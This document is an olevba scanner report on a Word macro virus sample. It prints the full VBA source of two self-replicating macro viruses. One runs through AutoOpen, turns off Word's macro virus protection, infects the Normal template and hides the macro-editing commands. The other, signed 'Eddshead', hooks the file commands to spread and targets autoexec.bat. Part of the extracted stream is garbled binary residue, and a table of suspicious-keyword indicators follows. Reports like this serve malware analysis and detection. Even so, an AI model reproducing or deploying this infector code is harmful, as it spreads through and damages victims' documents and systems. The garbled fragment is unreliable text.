olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
S.UserForm_Click
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
Select Case Day(Now)
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
Case 25 To 31
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
S.Show
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
End Select
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
End Sub
-------------------------------------------------------------------------------
VBA MACRO S.frm 
in file: Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754 - OLE stream: 'Macros/VBA/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
Sub UserForm_Click()
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
On Error GoTo out
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
Options.VirusProtection = False
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
Options.SaveNormalPrompt = False
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
Options.ConfirmConversions = False
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
If nt > 0 And ad > 0 Then GoTo out
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
If nt = 0 Then
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    Set infect = NormalTemplate.VBProject.VBComponents
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    Set host = ActiveDocument.VBProject.VBComponents
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    host.Item(1).codemodule.replaceline 3, Application.UserInitials & ".UserForm_Click"
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    host.Item(1).codemodule.replaceline 5, "select case day(now)"
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    host.Item(1).codemodule.replaceline 7, "case 25 to 31"
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    host.Item(1).codemodule.replaceline 9, Application.UserInitials & ".show"
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    host.Item(1).codemodule.replaceline 11, "end select"
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    host.Item(1).Name = infect.Item(1).Name
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    host.Item(2).Name = Application.UserInitials
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    host.Item(1).Export "c:\kernel.sys"
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    host.Item(2).Export "c:\kernel2.sys"
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
End If
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
If ad = 0 Then Set infect = ActiveDocument.VBProject.VBComponents
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
infect.Import ("c:\kernel2.sys")
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
infect.Item(1).codemodule.AddFromFile ("c:\kernel.sys")
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
With infect.Item(1).codemodule
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    For x = 1 To 4
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    .deletelines 1
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    Next x
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    If nt = 0 Then
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    .insertlines 14, vbCr & "Sub ViewVBCode()"
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    .insertlines 16, vbCr & "End Sub"
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    .insertlines 18, vbCr & "Sub ToolsMacro()"
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    .insertlines 20, vbCr & "End Sub"
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    CommandBars("tools").Controls("Templates and add-ins...").Delete
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    End If
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
End With
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
If nt = 0 Then infect.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
If nt = 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
With infect.Item(2).codemodule
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    .deletelines 1
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    For x = 1 To infect.Item(2).codemodule.countoflines Step 2
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    Next x
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
End With
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
With infect.Item(1).codemodule
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    For x = 2 To infect.Item(1).codemodule.countoflines Step 2
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
    Next x
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
End With
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
out:
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC
End Sub
'Skag9.6.1999 17:38:06Canon Bubble-Jet BJC-4000 on LPT1:VICTIM.DOC

-------------------------------------------------------------------------------
VBA MACRO DocumentSummaryInformation 
in file: Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754 - OLE stream: '\x05DocumentSummaryInformation'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    '   Food.Eddshead Macro Virus
    '   Coded by Eddshead ;)
    '   29th May 1998 ENGLAND
    '   Watch out, the next one will format your hard drive!
    
Sub Edds()
 
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
ActiveDocument.ReadOnlyRecommended = False
If Day(Now()) = 4 Then Call nasty("C:\autoexec.bat")
z4593895613 = 0
Set vx8956459313 = MacroContainer
If vx8956459313 = NormalTemplate Then z4593895613 = 1
If z4593895613 = 1 Then fuck45938 = NormalTemplate.FullName Else fuck45938 = ActiveDocument.FullName
If z4593895613 = 1 Then ki89561 = ActiveDocument.FullName Else ki89561 = NormalTemplate.FullName
Application.OrganizerCopy Source:=fuck45938, Destination:=ki89561, Name:="Edds", Object:=wdOrganizerObjectProjectItems
If z4593895613 = 1 And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If z4593895613 = 0 Then
     If NormalTemplate.Saved = False Then NormalTemplate.Save
     End If

fuckoff:
End Sub
Sub FileNew()
    On Error Resume Next
    Call Edds
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call Edds
End Sub
Sub ViewVBCode()
' no no no no no no !
End Sub
Sub FileSave()
    On Error Resume Next
    Call Edds
     ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Edds
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub ToolsOptions()
    On Error Resume Next
    Dialogs(wdDialogToolsOptions).Show
    Call Edds
End Sub
Sub EditFind()
    On Error Resume Next
    Dialogs(wdDialogEditFind).Show
    Call Edds
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call execute
    Dialogs(wdDialogFileSaveAs).Show
    Call Edds
End Sub
Sub FilePrint()
    On Error Resume Next
Dialogs(wdDialogFilePrint).Show
    Call Edds
End Sub
Sub FileExit()
    On Error Resume Next
    Call Edds
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pub
ll Edds
04 3000 00e()0 ; '�.dds..Call Edds
    IileSavel E0 ds
 0 34 f A  O5 EditFi Resum 3
    C  If A 3ddsnd Sub
Sub 32= FSaveAs()
352F 39als9 0hen8 
' no ocu3  Call exec!
End 3 Dind Sub 2 41 e()
' ent1 ).Show
 cument.Clent2Savd Sub
3533 33Nex4 t()
 Dialo 3rror Resume logs(wd 6 .Show
  n E5 6lePrint6gs(Et
4ub all 3533 33
  4 b
Surror R 3it()
    OnErr '... ResumelogEditF3ll Edds Call /    Call99)
d Sub
Sub Fi7:2 AMveDoation.Ort5veAs()esume9D
     If NormalTem93895613en15logs(w4Dialol Edds
    ()
    OnErr '.Ce N0 2 ; '�.dds     ctiCall&ument.Save
Appli Sub
Sub Fi7:2 As).Sho 0 00 Exirin4 0 35w
 3ddsn3334 32
E3 2= FSaveAs()n Erro 29als9 0he
End S 2 e Nextxt
9 2ec!3 3AEdd Dind Sub
S 3veD0 32 icati 1 me Next ication Ne6 5
  Sub
7533 33Nalse T 3n.Wialo 334te Resum3339 44umeF 3 Acw
  n E65 6lePrWindowSta 6ion40 ;1 33 33
  43l ESurror34 Iit()
3339  ;t()Ø.. 0hen8  O5 Edit 34 f 2
pub
2/Edds
04 3000 00e(9 Ed:l E0 dc!
End 3 Din2 se Then ActiveDovert5u3  Ca43
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�DiWa�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-=-=-=-=-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�This message was dedicated 2 all my friends, who have good skill but terminated from their company, and become joblessM.I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�You Will Be MissedF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Keep your good working guys, We appreciated with all you have done, good luck and success 4 U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN 'Virus.MSWord.Class.bx-1b61f1f0ef1279e0177d0633b4d063de0c795754' - OLE stream: 'Macros/S'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

